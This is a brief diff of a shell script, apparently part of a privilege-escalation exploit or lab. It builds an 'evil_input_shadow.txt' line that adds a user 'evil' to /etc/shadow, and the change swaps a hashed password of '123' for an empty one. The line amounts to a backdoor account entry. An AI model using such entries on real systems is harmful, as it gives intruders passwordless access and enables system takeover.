@@ -90,4 +90,4 @@ echo "[+] All Setting up Now you can run the script_1_attack..."
 # Crear entrada para /etc/shadow con contraseña "123"
 # Generado con: mkpasswd -m sha-512 123
 echo "[+] Creating evil_input_shadow.txt entry ..."
-echo 'evil:$6$rounds=656000$LHK0rUuzpTIaa0tz$N8XkkCT3L1S8hJleZYVFKyzv0ErFfQ2iMzSpbaYQbcDKcY0oQ1xV1N8Q43JjfwGFf3kXFeuBOg9MRGk/8CRh6.:19000:0:99999:7:::' > evil_input_shadow.txt
+echo 'evil::20250:0:99999:7:::' > evil_input_shadow.txt
